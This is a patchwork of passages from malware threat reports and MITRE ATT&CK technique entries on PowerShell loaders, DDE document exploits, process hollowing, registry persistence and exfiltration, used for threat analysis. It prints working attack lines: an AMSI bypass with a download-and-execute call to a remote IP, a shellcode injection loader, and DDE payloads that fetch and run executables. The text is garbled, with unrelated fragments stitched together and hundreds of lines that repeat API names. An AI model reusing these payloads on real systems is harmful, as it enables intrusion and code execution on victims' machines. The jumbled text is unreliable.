Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = "C:\ProgramData\" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = "HKLM:\Software\" Hkcu = "HKCU:\Software\" ValuE = "kaspersky" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12
The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server
The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques
On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system
The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL “hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai”
In the example above, the “spp.exe” executable would be added to an auto-run registry key at: SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iexplore Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key “agkrhfpdbvhdhrkj”; however, the loader’s main goal involved running the following command:/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;The base64 encoded command decodes to the following:$0o8e = '$f9B = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = "-enc ";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "&amp; $b32 $DKn $e"}else{;iex "&amp; powershell $DKn $e";}The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it
Upon execution in a vulnerable environment, the PowerShell based payload takes over
The PowerShell script is responsible for downloading the final payload from C2 server to execute it
Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)
Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes
Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO
These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.  hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server
The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d)  contains the following formula that Excel will save to the “A0” cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1
The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool
It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe "Office365DCOMCheck.vbs" "PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>"     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload
The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops
The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET
The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document
Then, it will launch Dec.exe using PowerShell with the command “ cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized ”.
FIN6 used PowerShell to execute an encoded command
The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell
After decoding out the blob, analysts found a PowerShell script.
Next, the script triggered a PowerShell stager
The macro contains a PowerShell script to persist in the "Run" registry key, "KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding".
Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run The command line execution leads to PowerShell code executed from a different registry value .
the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project
PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.

[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) 

Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) 

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)
A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).  Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)
Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)
The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded
In this context the main function is executed."Console": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\Software\Microsoft\Windows\CurrentVersion\Run\runsample )."Sample": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API
The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function
The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer
FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
Windows API calls 
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
 Win32 API
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
CreateProcess 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadLibrary 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 LoadModule() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 
LoadPackagedLibrary() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 WinExec() 
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
 ShellExecute
Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).
Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs
Unpacks the code in memory via process hollowing
It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable
Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process
Figure 6 Example of delivery document The RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety here:       {\rtf1{\field{\*\fldinst DDEAUTO "C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe " "/C	POWErsHELl.eXE  -ex     BypaSs  -NOP	-w      HIdDen  (NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'  ,       '%apPDAtA%\graph.exe'   )   ;       saps    '%Appdata%\graph.exe'"}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload
Figure 1 Article referenced by decoy document in attack against British government agency   The attached document leverages a DDE exploit to ultimately execute the following code:c:\\windows\\system32\\cmd.exe "/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\AAA.exe');Start-Process('%TEMP%\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it
Upon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract an embedded payload from a resource named “B”, save it to %TEMP%\%BIND1%, and create a new process with the embedded payload
Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. 
Indicators of compromise MITRE ATT&CK techniques  Modify existing service Code signing File deletion Deobfuscate/decode files or information System information discovery Process discovery Service execution RunDLL32 Scripting Command-line Interface Data from local system Automated exfiltration Data encrypted Commonly used port Bypass user account control  Hashes  fe32d29fa16b1b71cd27b23a78ee9f6b7791bff3 f684e15dd2e84bac49ea9b89f9b2646dc32a2477 1d280a77595a2d2bbd36b9b5d958f99be20f8e06 19d9573f0b2c2100accd562cc82d57adb12a57ec f90a2155ac492c3c2d5e1d83e384e1a734e59cc0 9b832dda912cce6b23da8abf3881fcf4d2b7ce09 f3b62fea38cb44e15984d941445d24e6b309bc7b 66d2cea01b46c3353f4339a986a97b24ed89ee18 7113aaab61cacb6086c5531a453adf82ca7e7d03 d41daba0ebfa55d0c769ccfc03dbf6a5221e006a 25f4819e7948086d46df8de2eeeaa2b9ec6eca8c 35ab747c15c20da29a14e8b46c07c0448cef4999 e87de3747d7c12c1eea9e73d3c2fb085b5ae8b42 0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0 bca861a46d60831a3101c50f80a6d626fa99bf16 01530adb3f947fabebae5d9c04fb69f9000c3cef 4229896d61a5ad57ed5c247228606ce62c7032d0 4c7e975f95ebc47423923b855a7530af52977f57 5a6ad7a1c566204a92dd269312d1156d51e61dc4 1dc50bfcab2bc80587ac900c03e23afcbe243f64 003e21b02be3248ff72cc2bfcd05bb161b6a2356 9b7c3c48bcef6330e3086de592b3223eb198744a 85e2453b37602429596c9681a8c58a5c6faf8d0c  Domains  ftp.byethost31.com ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com
Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function
It then uses WebDAV to upload to a Box cloud drive.
Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) 
Registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ” is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop
Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use
Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String
Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named ‘GSrdofjksrgj’, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool
The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:
Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.
The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s

The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.

